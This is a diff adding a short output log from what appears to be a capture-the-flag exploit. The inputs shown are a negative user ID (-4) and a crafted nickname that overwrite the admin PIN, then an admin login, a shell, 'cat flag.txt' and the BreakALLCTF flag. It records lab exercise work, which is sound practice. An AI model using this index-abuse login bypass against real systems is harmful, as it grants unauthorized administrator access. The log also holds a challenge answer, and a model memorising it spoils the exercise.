@@ -1,0 +1,28 @@
+[<] 1st user id
+User ID: 
+[>] Sending: b'-4'
+[<] 1st nickname (modify pin)
+Nickname: 
+[>] Sending: b'000000'
+[<] 1st pin
+PIN: 
+[>] Sending: b'10'
+[<] 2nd user id
+Logging as [000000] ... Failed
+Incorrect PIN code!
+
+User ID: 
+[>] Sending: b'0'
+[<] 2nd nickname
+Nickname: 
+[>] Sending: b'admin'
+[<] 2nd pin
+PIN: 
+[>] Sending: b'52983525027888'
+[<] Shell
+Logging as [admin] ... Ok!
+
+
+[>] Sending: b'cat flag.txt'
+[<] Flag
+BreakALLCTF{DJPD61GTBQIqqL7sWEvF}
